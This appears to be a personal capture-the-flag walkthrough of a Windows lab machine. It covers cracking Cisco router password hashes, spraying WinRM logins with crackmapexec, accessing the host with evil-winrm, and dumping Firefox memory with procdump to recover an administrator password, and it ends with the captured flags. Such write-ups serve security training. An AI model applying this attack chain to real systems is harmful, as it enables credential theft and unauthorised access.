## User
### WEB-Browser 
http://10.129.96.157/
Login as Guest
http://10.129.96.157/attachments/config.txt		
Router Config
![[Pasted image 20240520202654.png]]
#### Interesting Fields
```
enable secret 5 \$1\$pdQG\$o8nrSzsGXeaduXrjlvKc91
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
```
### COMMAND
```sh
nano pwdSecret
#Put the Enable Secret 5 hash in the file.
hashcat pwdSecret  /home/kali/Downloads/rockyou.txt
```
#### CREDS
```
User:
	Hazard
Password:
	$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent  
(The other 2 correlate to a Type 7 cisco password)
				[IFM - Cisco Password Cracker](https://www.ifm.net.nz/cookbooks/passwordcracker.html)
User:
	rout3r
Password:
	$uperP@ssword
User:
	Admin
Password:
	Q4)sJu\\Y8qz\*A3\?d
```
### COMMAND
```sh
impacket-lookupsid Hazard:stealth1agent@10.129.96.157
```
#### Interesting Fields
```
500: SUPPORTDESK\\Administrator (SidTypeUser)
501: SUPPORTDESK\\Guest (SidTypeUser)
503: SUPPORTDESK\\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\\None (SidTypeGroup)
1008: SUPPORTDESK\\Hazard (SidTypeUser)
1009: SUPPORTDESK\\support (SidTypeUser)
1012: SUPPORTDESK\\Chase (SidTypeUser)
1013: SUPPORTDESK\\Jason (SidTypeUser)
```
### COMMAND
```sh
#Create a file that contains the Users & another that contains the passwords.
crackmapexec winrm 10.129.96.157 -u users.txt -p Passwords.txt
evil-winrm -u chase -p "Q4)sJu\Y8qz*A3?d" -i 10.129.96.157
```
### USER PWN:
```sh
type C:\Users\Chase\Desktop\user.txt
```

```
3f2fcb700ab365f8a784eab5ead02a04
```
## Root
### COMMAND
```sh
upload procdump.exe
ps
.\procdump.exe -accepteula -ma <PID>
upload strings.exe
.\strings.exe -accepteula firefox<numbas>.dmp >goingtobridgemyself
.\strings.exe -acccepteula firefox<numbas>.dmp | findstr "password"
download goingtobridgemyself
```
### ROOT PWN
```sh
evil-winrm -i 10.129.96.157 -u administrator -p '4dD!5}x/re8]FBuZ'
```

```
0bf61a3d7d7c5f20bdbb63c88c96bb13
```


